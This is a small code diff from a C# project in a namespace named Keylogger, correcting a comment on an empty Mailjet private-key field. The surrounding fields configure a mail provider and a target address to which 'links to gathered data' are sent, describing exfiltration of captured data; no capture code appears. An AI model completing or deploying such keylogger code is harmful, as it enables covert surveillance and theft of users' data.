@@ -30,7 +30,7 @@ namespace Keylogger
             new ExpireBox()
         };
         private readonly string MailJetPublicKey = "";        // Public key for Mailjet service - sending mail
-        private readonly string MailJetPrivateKey = "";       // Public key for Mailjet service - sending mail
+        private readonly string MailJetPrivateKey = "";       // Private key for Mailjet service - sending mail
         private readonly IMailProvider Mailprovider;          // Mail provider for sending mails
         private readonly string TargetMail = "mail@example.com";  // Mail where links to gathered data will be sent
 
